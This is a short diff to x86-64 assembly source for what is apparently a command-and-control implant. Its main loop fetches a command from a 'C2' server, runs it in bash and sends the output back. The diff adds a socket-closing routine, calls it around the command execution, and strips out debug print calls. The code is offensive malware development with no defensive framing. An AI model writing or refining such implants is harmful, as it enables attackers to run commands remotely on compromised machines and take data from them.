@@ -55,6 +55,7 @@ section .text
     global fn_cleanup
     global fn_server_callback
     global fn_itoa
+    global fn_close_socket
 
 ; Function to exit
 fn_error_exit:
@@ -114,6 +115,20 @@ fn_cleanup:
     ; Zero buffer lengths
     mov qword [cmd_buffer_length], 0x0
     mov qword [tx_buffer_length], 0x0
+
+    mov rsp, rbp
+    pop rbp
+    ret
+
+; Function to close socket
+fn_close_socket:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x8                ; Stackframe
+
+    mov rax, 0x3                ; close syscall
+    mov rdi, qword [socket_fd]
+    syscall
 
     mov rsp, rbp
     pop rbp
@@ -732,12 +747,11 @@ _start:
     ; Get command from server
     call fn_get_command
 
-    ;call fn_dbg_print_rx_buffer
-    ;call fn_dbg_print_cmd_buffer
-
+    ; Close connection to C2
+    call fn_close_socket
+    
     ; Execute command in bash
     call fn_exec_cmd
-    ;call fn_dbg_print_tx_buffer
 
     ; Store command into old command buffer, can compare afterwards
     lea rdi, [cmd_buffer_old]
@@ -752,6 +766,9 @@ _start:
     
     ; Return output of command
     call fn_server_callback
+
+    ; Close connection to C2
+    call fn_close_socket
 
     mov qword [sleep_time], 0x2         ; Sleep 2 seconds
     call fn_sleep
